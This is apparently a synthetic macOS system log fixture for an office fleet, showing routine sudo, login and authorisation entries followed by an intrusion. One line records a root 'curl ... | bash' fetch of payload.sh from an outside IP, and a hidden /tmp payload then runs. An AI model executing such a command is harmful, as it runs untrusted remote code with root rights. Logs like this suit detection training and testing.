+Apr 24 16:58:03 imac-finance-01 sudo[2402]: tjohnson : TTY=ttys000 ; PWD=/Users/tjohnson ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 24 17:29:47 mac-mini-server loginwindow[123]: USER_PROCESS: 502 rgarcia
+Apr 24 17:50:00 imac-finance-01 sudo[8632]: mwilliams : TTY=ttys000 ; PWD=/Users/mwilliams ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 24 17:59:42 macbook-pro-jsmith authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 508)
+Apr 24 18:09:31 macbook-pro-jsmith sudo[2438]: kchen : TTY=ttys000 ; PWD=/Users/kchen ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 24 18:48:59 macbook-pro-kchen authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 507)
+Apr 24 19:07:17 macbook-pro-jsmith loginwindow[123]: USER_PROCESS: 502 lwong
+Apr 24 19:15:15 mac-mini-server sudo[3956]: mwilliams : TTY=ttys000 ; PWD=/Users/mwilliams ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 24 19:27:40 imac-finance-01 loginwindow[123]: USER_PROCESS: 502 jsmith
+Apr 24 19:54:24 macbook-pro-jsmith loginwindow[123]: Authentication failed for user apatel
+Apr 24 19:58:21 macbook-pro-jsmith authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 509)
+Apr 24 21:19:14 imac-finance-01 authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 507)
+Apr 24 21:20:09 macbook-pro-kchen sshd[5757]: Accepted publickey for mwilliams from 10.0.3.49 port 49828 ssh2
+Apr 24 21:20:47 macbook-pro-kchen authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 505)
+Apr 25 02:44:24 macbook-pro-kchen sudo[8821]: kchen : TTY=ttys001 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'curl -s http://194.165.16.118/payload.sh | bash'
+Apr 25 02:44:27 macbook-pro-kchen sudo[8821]: pam_unix(sudo:session): session opened for user root by kchen(uid=0)
+Apr 25 02:44:35 macbook-pro-kchen com.apple.xpc.launchd[1]: (com.apple.suspicious.malware.124) Spawned process: /tmp/.hidden_payload
